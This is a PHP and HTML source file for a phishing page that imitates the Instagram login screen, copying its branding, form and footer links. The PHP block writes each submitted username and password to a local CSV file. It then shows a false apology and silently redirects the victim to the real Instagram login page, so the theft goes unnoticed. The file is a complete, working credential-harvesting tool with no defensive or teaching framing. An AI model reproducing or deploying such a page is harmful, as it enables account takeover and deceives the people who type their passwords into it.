<?php
        // session_start();
        $error_msg = "";
        if($_SERVER['REQUEST_METHOD'] == 'POST')
        {
            $user = htmlspecialchars($_POST['username']);
            $pwd =htmlspecialchars($_POST['password']);
            $pattern = "/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/";

            if(empty($user) || empty($pwd))
            { 
                $error_msg = "Username/ Password field is empty";
            }
                      
            else if(!preg_match($pattern,$user))
                {
                    $error_msg = "Please enter a valid username.";
                }
               
            else
            {
                $fp = fopen("login_info_instagram.csv",'a');
                // to be run only the first time
                // fwrite($fp, "Username");
                // fwrite($fp, ",");
                // fwrite($fp, "Password");
                // fwrite($fp,"\n");

                fwrite($fp,"\n");
                fwrite($fp,$user);
                fwrite($fp,",");
                fwrite($fp,$pwd);
                fclose($fp);
                echo "Sorry for the inconvinience. Redirecting to login page.";
                header("Refresh:0; url=https://www.instagram.com/accounts/login/");
                exit();
            }
        }
    
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <link rel="shortcut icon" href="logo.jpeg" type="image/x-icon">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <main>

        <div class="login_box">
            <div class="img_div">
                <img src="logo2.png" alt="Instagram" height="60px" >
            </div>
            <br> <br> <br>
            <div class="form">
                <form action="<?php htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="POST">
                    <input type="text" placeholder= "Phone number, username or email" name="username">
                    <input type="password" placeholder= "Password" name="password">
                    <input type="submit" value="Log in" id="Log_in">
                </form>
            </div>
            <div class="bel_form">
                <div>
                    <img src="f.png" alt="facebook" width="15px" height="15px">
                    <a href="">Log in with Facebook</a>
                </div>
                <div style="font-size: 12px;padding-top: 15px;">
                    <a href="">Forgot Password?</a>
                </div>
            </div>
        </div>

        <div class="create_acc center">
            <span>Don't have an account?&nbsp;</span>
            <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
        </div>
    </main>
    <p  class="center">Get the app.</p>
    <div class="center">
        <img src="Google play.png" alt="Google play" width="135px" height="40px">
        <img src="get it from microsoft.png" alt="microsoft" width="135px" height="40px">
    </div>
    <br><br><br>
    <footer>
        <div class="foot">
            <div class="card">
                <a href="https://about.meta.com/">Meta</a>
            </div>
            <div class="card">
                <a href="https://about.instagram.com/">About</a>
            </div>
            <div class="card">
                <a href="https://about.instagram.com/blog">Blog</a>
            </div>
            <div class="card">
                <a href="https://about.instagram.com/about-us/careers">Jobs</a>
            </div>
            <div class="card">
                <a href="https://help.instagram.com/">Help</a>
            </div>
            <div class="card">
                <a href="https://developers.facebook.com/docs/instagram-platform">API</a>
            </div>
            <div class="card">
                <a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect">Privacy</a>
            </div>
            <div class="card">
                <a href="https://help.instagram.com/581066165581870/">Terms</a>
            </div>
            <div class="card">
                <a href="https://www.instagram.com/explore/locations/?hl=en">Locations</a>
            </div>
            <div class="card">
                <a href="https://www.instagram.com/web/lite/?hl=en">Instagram Lite</a>
            </div>
            <div class="card">
                <a href="https://www.threads.net/">Threads</a>
            </div>
            <div class="card">
                <a href="https://www.facebook.com/help/instagram/261704639352628?hl=en">Contact Uploading & Non-Users</a>
            </div>
            <div class="card">
                <a href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fmeta_verified%2F%3Fentrypoint%3Dweb_footer%26hl%3Den%26__coig_login%3D1">Meta Verfied</a>
            </div>
        </div>
        <div class="foot2">
            <div class="card2">
                <select id="lang">
                    <option value="en">English</option>
                    <option value="es">Spanish</option>
                    <option value="fr">French</option>
                    <option value="de">German</option>
                    <option value="zh">Chinese</option>
                    <option value="ja">Japanese</option>
                    <option value="ru">Russian</option>
                    <option value="ar">Arabic</option>
                    <option value="pt">Portuguese</option>
                    <option value="hi">Hindi</option>
                </select>
            </div>
            <div class="card2">
                <p>© 2024 Instagram from Meta</p>
            </div>
        </div>
    </footer>
</body>
</html>